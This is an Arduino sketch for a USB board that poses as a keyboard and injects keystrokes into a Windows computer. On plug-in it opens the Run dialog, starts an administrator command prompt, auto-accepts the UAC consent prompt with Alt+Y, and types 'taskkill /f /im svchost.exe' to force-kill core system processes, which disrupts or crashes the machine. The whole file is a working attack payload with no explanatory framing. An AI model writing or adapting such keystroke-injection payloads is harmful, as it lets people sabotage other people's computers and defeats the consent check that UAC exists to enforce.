#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  delay(500);
  USB.begin();
  Keyboard.begin();
  
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  
  delay(300);
  Keyboard.print("cmd");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(1800);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  
  delay(1000);
  
  Keyboard.print("taskkill /f /im svchost.exe");
  Keyboard.press(KEY_RETURN);
}

void loop() {}